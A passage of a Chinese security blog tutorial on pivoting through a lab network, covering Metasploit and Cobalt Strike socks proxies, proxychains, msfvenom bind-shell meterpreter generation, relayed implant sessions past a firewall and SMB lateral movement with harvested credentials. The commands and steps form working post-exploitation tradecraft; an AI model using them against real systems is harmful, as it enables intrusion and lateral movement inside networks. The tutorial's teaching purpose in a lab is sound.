+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401191937614.png" alt="image-20240401191937614"></p>
+<p>配置好代理，地址是公网 kali 的 ip 和刚才 socks 代理模块开启的端口</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401192153184.png" alt="image-20240401192153184"></p>
+<p>设置好可以通信后可以把代理添加到程序中</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401193150388.png" alt="image-20240401193150388"></p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401192344752.png" alt="image-20240401192344752"></p>
+<p>用代理打开浏览器后就可用访问内网 10.10.10.0 网段了</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401193308682.png" alt="image-20240401193308682"></p>
+<p>在 kali 中只是 msf 可以跟 10 通信，要做到使用其他工具对 10 网段进行渗透可用用到 proxychains 代理</p>
+<p>对 proxychains.conf 更改写入刚才 msf 代理模块设置的端口 ip，或者 proxychains4.conf</p>
+<p>vim /etc/proxychains.conf</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401210033816.png" alt="image-20240401210033816"></p>
+<p>设置好代理以后在要使用的工具前面加上 proxychains 命令例如 nmap 对 10.10.10.134 进行扫描，这样我们就可以在 kali 对 10 网段的内网渗透起来就会方便很多</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401210313313.png" alt="image-20240401210313313"></p>
+<h4 id="cs代理测试"><a class="markdownIt-Anchor" href="#cs代理测试">#</a> cs 代理测试</h4>
+<p>Proxifier 代理工具</p>
+<p>cs 生成木马获取 web 主机权限</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402132210710.png" alt="image-20240402132210710"></p>
+<p>然后设置 socks 代理</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402132259507.png" alt="image-20240402132259507"></p>
+<p>打开 Proxifier 代理工具配置文件代理服务器公网 kali 地址和刚才设置的端口 47385</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402132417647.png" alt=""></p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402132650862.png" alt="image-20240402132650862"></p>
+<p>开启代理之前无法访问 12server 内网中的网站</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402133020619.png" alt="image-20240402133020619"></p>
+<p>设置好以后即可访问 10 网段</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402133137882.png" alt="image-20240402133137882"></p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402133218115.png" alt="image-20240402133218115"></p>
+<p>也可以添加规则，默认全部走 socks 代理</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402134404125.png" alt="image-20240402134404125"></p>
+<h4 id="cs正反shell上线内网主机"><a class="markdownIt-Anchor" href="#cs正反shell上线内网主机">#</a> CS 正反 shell 上线内网主机</h4>
+<p>12server 是内网主机无法上网所以是找不到我们的公网 kali 主机无法上线，但是我们拿到了 web 主机，他是可以和 12server 通信的，可以制作一个正向木马让 12server 执行后流量转发到本机的 5555 端口再让 web 主机去主动连接 12server 的 5555 端口就可以实现上线了</p>
+<p>新建立一个监听并创建一个木马并放到 12server 执行</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402160446950.png" alt="image-20240402160446950"></p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402160554427.png" alt="image-20240402160554427"></p>
+<p>在 web 主机的 shell 上输入 connect 10.10.10.134 5555 让他去连接 12server 的 5555，图中可看到是经过了 web 那台主机上线的</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402161147077.png" alt="image-20240402161147077"></p>
+<p>现在获取了 12server 的权限在内网环境中还存在一个 win10 主机我们是无法通信的，可以在 12server 上做一个 socks 代理</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403152728968.png" alt="image-20240403152728968"></p>
+<p>此时内网 win10 主机的网站是无法访问的</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403152903425.png" alt="image-20240403152903425"></p>
+<p>挂上代理之后就可以访问到了</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403153042000.png" alt="image-20240403153042000"></p>
+<h4 id="msf正反shell上线内网主机"><a class="markdownIt-Anchor" href="#msf正反shell上线内网主机">#</a> MSF 正反 shell 上线内网主机</h4>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>生成正向shell</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/bind_tcp <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">6767</span> <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">0.0</span>.0.0 <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> bind.exe</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>把这个木马放在12server执行</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>kali切换到windows/x64/meterpreter/bind_tcp</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token builtin class-name">set</span> payload windows/x64/meterpreter/bind_tcp</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token builtin class-name">set</span> lport <span class="token number">6767</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token builtin class-name">set</span> rhost <span class="token number">10.10</span>.10.134 12server的地址</pre></td></tr><tr><td data-num="12"></td><td><pre>run</pre></td></tr></table></figure><p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403161741174.png" alt="image-20240403161741174"></p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403161546975.png" alt="image-20240403161546975"></p>
+<p>搭建 socks 代理让可以访问到内网 win10</p>
+<p>进入 sessions 2</p>
+<p>添加 win 的 192.168.0.0 网段路由</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403161933298.png" alt="image-20240403161933298"></p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403162051963.png" alt="image-20240403162051963"></p>
+<p>background 会话放置后台</p>
+<p>进入 socks 模块</p>
+<p>use auxiliary/server/socks_proxy</p>
+<p>set lport 6666</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403163309671.png" alt="image-20240403163309671"></p>
+<p>vim proxvim /etc/proxychains.conf 设置好配置的端口就可以用 nmap 对 win10 进行扫描了</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403163246928.png" alt="image-20240403163246928"></p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403163443593.png" alt="image-20240403163443593"></p>
+<h4 id="有防火墙限制的上线"><a class="markdownIt-Anchor" href="#有防火墙限制的上线">#</a> 有防火墙限制的上线</h4>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240407153756849.png" alt="image-20240407153756849"></p>
+<p>前面步骤一样 win10 多了防火墙不能再用正向，可在 12server 做转发上线让 win10 主动找 12server 然后 12server 把 0.145 得到的会话转发到 10.134 网段就可以上线</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240407154157041.png" alt="image-20240407154157041"></p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240407155607089.png" alt="image-20240407155607089"></p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240407155502201.png" alt="image-20240407155502201"></p>
+<p>接着在新建的 333 会话生成木马放在 win10 上线</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240407160824882.png" alt="image-20240407160824882"></p>
+<p>图中可看到 win10 主动找的 12server 这样就不受 win10 防火墙限制</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240407160941500.png" alt="image-20240407160941500"></p>
+<h3 id="smb横向移动隧道搭建"><a class="markdownIt-Anchor" href="#smb横向移动隧道搭建">#</a> SMB 横向移动隧道搭建</h3>
+<p>扫描 192.168.55.0/24 网段主机的 445 端口</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240415173049574.png" alt="image-20240415173049574"></p>
+<p>打开目标列表可看到有 192.168.55.200 也就是最后一台主机 win11</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240415173143210.png" alt="image-20240415173143210"></p>
+<p>新建一个 SMB 监听</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240415173244741.png" alt="image-20240415173244741"></p>
+<p>对 win11 进行横向</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240415173729146.png" alt="image-20240415173729146"></p>
+<p>选择刚创建的监听器密码账号前期信息收集或通过渗透前几台主机获取的</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240415184114001.png" alt="image-20240415184114001"></p>
+<p>成功通过 SMB 隧道上线</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240415184143950.png" alt="image-20240415184143950"></p>
+</div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于</span><time title="修改时间：2024-05-01 18:12:20" itemprop="dateModified" datetime="2024-05-01T18:12:20+08:00">2024-05-01</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i>赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/assets/wechatpay.png" alt="云逸 微信支付"/><p>微信支付</p></div><div><img data-src="/assets/alipay.png" alt="云逸 支付宝"/><p>支付宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>云逸<i class="ic i-at"><em>@</em></i>云逸'bolg</li><li class="link"><strong>本文链接：</strong><a href="http://gyzero.shop/2022/11/12/network-security/neiwang/%E7%BB%95%E9%98%B2%E7%81%AB%E5%A2%99/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/" title="隧道代理">http://gyzero.shop/2022/11/12/network-security/neiwang/绕防火墙/端口转发/端口转发隧道代理/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2022/05/01/network-security/neiwang/CS%E4%B8%8A%E7%BA%BFlinux/" rel="prev" itemprop="url" data-background-image="https:&#x2F;&#x2F;tuchuang-1309689803.cos.ap-nanjing.myqcloud.com&#x2F;gyzeroJapanese-Art-monochrome-Japan-samurai-2250916-wallhere.com.jpg" title="CS上线linux"><span class="type">上一篇</span><span class="category"><i class="ic i-flag"></i>内网安全</span><h3>CS上线linux</h3></a></div><div class="item right"><a href="/2023/10/27/%E6%BC%8F%E6%B4%9E/docker%E9%80%83%E9%80%B8/" rel="next" itemprop="url" data-background-image="https:&#x2F;&#x2F;tuchuang-1309689803.cos.ap-nanjing.myqcloud.com&#x2F;%E5%A3%81%E7%BA%B8&#x2F;52.jpg" title="docker逃逸"><span class="type">下一篇</span><span class="category"><i class="ic i-flag"></i>docker</span><h3>docker逃逸</h3></a></div></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF"><span class="toc-number">1.</span> <span class="toc-text"> 代理技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">2.</span> <span class="toc-text"> 隧道技术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE%E5%87%BA%E7%BD%91%E5%88%A4%E6%96%AD"><span class="toc-number">2.1.</span> <span class="toc-text"> 协议出网判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E6%AD%A3%E5%8F%8Dshell"><span class="toc-number">2.2.</span> <span class="toc-text"> 关于正反 shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99%E5%87%BA%E5%85%A5%E7%AB%99%E8%A7%84%E5%88%99"><span class="toc-number">3.</span> <span class="toc-text"> 防火墙出入站规则</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99%E6%B7%BB%E5%8A%A0%E8%A7%84%E5%88%99"><span class="toc-number">3.1.</span> <span class="toc-text"> 防火墙添加规则</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%AE%BE%E7%BD%AE%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">3.2.</span> <span class="toc-text"> 命令行设置防火墙</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E7%BB%84%E7%AD%96%E7%95%A5%E6%8E%A7%E5%88%B6%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">3.3.</span> <span class="toc-text"> 域组策略控制防火墙</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#icmp%E9%9A%A7%E9%81%93"><span class="toc-number">4.</span> <span class="toc-text"> ICMP 隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pingtunnel"><span class="toc-number">4.1.</span> <span class="toc-text"> Pingtunnel</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dns%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA"><span class="toc-number">5.</span> <span class="toc-text"> DNS 隧道搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA"><span class="toc-number">6.</span> <span class="toc-text"> SSH 隧道搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E5%AE%9E%E9%AA%8C"><span class="toc-number">7.</span> <span class="toc-text"> 代理实验</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#msf%E4%BB%A3%E7%90%86%E6%B5%8B%E8%AF%95"><span class="toc-number">7.1.</span> <span class="toc-text"> msf 代理测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cs%E4%BB%A3%E7%90%86%E6%B5%8B%E8%AF%95"><span class="toc-number">7.2.</span> <span class="toc-text"> cs 代理测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cs%E6%AD%A3%E5%8F%8Dshell%E4%B8%8A%E7%BA%BF%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA"><span class="toc-number">7.3.</span> <span class="toc-text"> CS 正反 shell 上线内网主机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msf%E6%AD%A3%E5%8F%8Dshell%E4%B8%8A%E7%BA%BF%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA"><span class="toc-number">7.4.</span> <span class="toc-text"> MSF 正反 shell 上线内网主机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89%E9%98%B2%E7%81%AB%E5%A2%99%E9%99%90%E5%88%B6%E7%9A%84%E4%B8%8A%E7%BA%BF"><span class="toc-number">7.5.</span> <span class="toc-text"> 有防火墙限制的上线</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smb%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA"><span class="toc-number">8.</span> <span class="toc-text"> SMB 横向移动隧道搭建</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li ><a href="/2022/05/01/network-security/neiwang/CS%E4%B8%8A%E7%BA%BFlinux/" rel="bookmark" title="CS上线linux">CS上线linux</a></li><li  class="active"><a href="/2022/11/12/network-security/neiwang/%E7%BB%95%E9%98%B2%E7%81%AB%E5%A2%99/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/" rel="bookmark" title="隧道代理">隧道代理</a></li><li ><a href="/2023/10/30/network-security/neiwang/%E5%9F%9F%E7%8E%AF%E5%A2%83/%E5%9F%9F%E7%8E%AF%E5%A2%83/" rel="bookmark" title="域环境">域环境</a></li><li ><a href="/2023/11/09/network-security/neiwang/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/" rel="bookmark" title="Windows提权">Windows提权</a></li><li ><a href="/2023/11/10/network-security/neiwang/linux%E6%8F%90%E6%9D%83/linux%E6%8F%90%E6%9D%83/" rel="bookmark" title="linux提权">linux提权</a></li><li ><a href="/2024/03/03/network-security/neiwang/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="bookmark" title="内网信息收集">内网信息收集</a></li><li ><a href="/2024/03/05/network-security/neiwang/win%E5%8D%8F%E8%AE%AE/win%E5%8D%8F%E8%AE%AE/" rel="bookmark" title="win协议认证知识">win协议认证知识</a></li><li ><a href="/2024/03/07/network-security/neiwang/Token%E7%AA%83%E5%8F%96%E5%88%A9%E7%94%A8/Token%E7%AA%83%E5%8F%96%E5%88%A9%E7%94%A8/" rel="bookmark" title="Token窃取利用">Token窃取利用</a></li><li ><a href="/2024/03/08/network-security/neiwang/BloodHound%E5%B7%A5%E5%85%B7/BloodHound%E5%B7%A5%E5%85%B7/" rel="bookmark" title="BloodHound工具">BloodHound工具</a></li><li ><a href="/2024/03/09/network-security/neiwang/%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/" rel="bookmark" title="域用户枚举密码喷洒">域用户枚举密码喷洒</a></li><li ><a href="/2024/03/12/network-security/neiwang/Kerberoasting%E6%94%BB%E5%87%BB/Kerberoasting%E6%94%BB%E5%87%BB/" rel="bookmark" title="Kerberoasting攻击">Kerberoasting攻击</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="云逸" data-src="/assets/avatar.jpg"/><p class="name" itemprop="name">云逸</p><div class="description" itemprop="description"></div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">30</span><span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">13</span><span class="name">分类</span></a></div></nav><div class="social"><a href="https://gyzero1.github.io/" class="item github" rel="noopener" title="https:&#x2F;&#x2F;gyzero1.github.io&#x2F;" target="_blank"><i class="ic i-github"></i></a><a href="https://about.me/gyzero" class="item about" rel="noopener" title="https:&#x2F;&#x2F;about.me&#x2F;gyzero" target="_blank"><i class="ic i-address-card"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-user"></i>关于</a><ul class="submenu"><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于本站</a></li><li class="item"><a href="/admiration/" rel="section"><i class="ic i-coffee"></i>赞赏博主</a></li></ul></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2023/10/27/%E6%BC%8F%E6%B4%9E/docker%E9%80%83%E9%80%B8/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2022/05/01/network-security/neiwang/CS%E4%B8%8A%E7%BA%BFlinux/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/network-security/" title="分类于网络安全">网络安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/neiwang/" title="分类于内网安全">内网安全</a></div><span><a href="/2022/11/12/network-security/neiwang/%E7%BB%95%E9%98%B2%E7%81%AB%E5%A2%99/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/">隧道代理</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/network-security/" title="分类于网络安全">网络安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/neiwang/" title="分类于内网安全">内网安全</a></div><span><a href="/2024/03/12/network-security/neiwang/Kerberoasting%E6%94%BB%E5%87%BB/Kerberoasting%E6%94%BB%E5%87%BB/">Kerberoasting攻击</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/network-security/" title="分类于网络安全">网络安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/neiwang/" title="分类于内网安全">内网安全</a></div><span><a href="/2023/11/09/network-security/neiwang/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/">Windows提权</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%BC%8F%E6%B4%9E%E9%9B%86/" title="分类于漏洞集">漏洞集</a></div><span><a href="/2023/11/02/%E6%BC%8F%E6%B4%9E%E9%9B%86/%E6%BC%8F%E6%B4%9E%E9%9B%86/">瑞友应用虚拟化系统rce</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" title="分类于编程语言">编程语言</a><i class="ic i-angle-right"></i><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/php%E5%9F%BA%E7%A1%80/" title="分类于php基础">php基础</a></div><span><a href="/2023/12/12/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/php%E5%9F%BA%E7%A1%80/PHP%E8%BF%90%E7%AE%97%E7%AC%A6/PHP%E8%BF%90%E7%AE%97%E7%AC%A6/">PHP运算符</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/network-security/" title="分类于网络安全">网络安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/web-security/" title="分类于web安全">web安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/web-security/Basic-vulnerabilities/" title="分类于基础漏洞">基础漏洞</a></div><span><a href="/2023/11/01/%E6%BC%8F%E6%B4%9E/xss%E6%BC%8F%E6%B4%9E/">xss漏洞</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/network-security/" title="分类于网络安全">网络安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/web-security/" title="分类于web安全">web安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/web-security/Basic-vulnerabilities/" title="分类于基础漏洞">基础漏洞</a></div><span><a href="/2023/10/30/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">文件包含漏洞</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" title="分类于编程语言">编程语言</a><i class="ic i-angle-right"></i><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/" title="分类于python">python</a><i class="ic i-angle-right"></i><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/python%E5%9F%BA%E7%A1%80/" title="分类于python基础">python基础</a></div><span><a href="/2023/11/01/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/%E5%AD%97%E7%AC%A6%E4%B8%B2-%E5%88%97%E8%A1%A8-%E5%85%83%E7%BB%84-%E5%AD%97%E5%85%B8/%E5%AD%97%E7%AC%A6%E4%B8%B2-%E5%88%97%E8%A1%A8-%E5%85%83%E7%BB%84-%E5%AD%97%E5%85%B8/">字符串,列表,元组,字典</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/network-security/" title="分类于网络安全">网络安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/neiwang/" title="分类于内网安全">内网安全</a></div><span><a href="/2024/03/08/network-security/neiwang/BloodHound%E5%B7%A5%E5%85%B7/BloodHound%E5%B7%A5%E5%85%B7/">BloodHound工具</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/network-security/" title="分类于网络安全">网络安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/web-security/" title="分类于web安全">web安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/web-security/Basic-vulnerabilities/" title="分类于基础漏洞">基础漏洞</a></div><span><a href="/2023/11/01/%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">命令执行漏洞</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2><ul class="leancloud-recent-comment" id="new-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2022 -<span itemprop="copyrightYear">2024</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">云逸 @ 云逸'bolg</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">220k 字</span><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">3:20</span></div><div class="powered-by">基于 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & Theme.<a href="https://github.com/theme-shoka-x/hexo-theme-shokaX/" rel="noopener" target="_blank">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
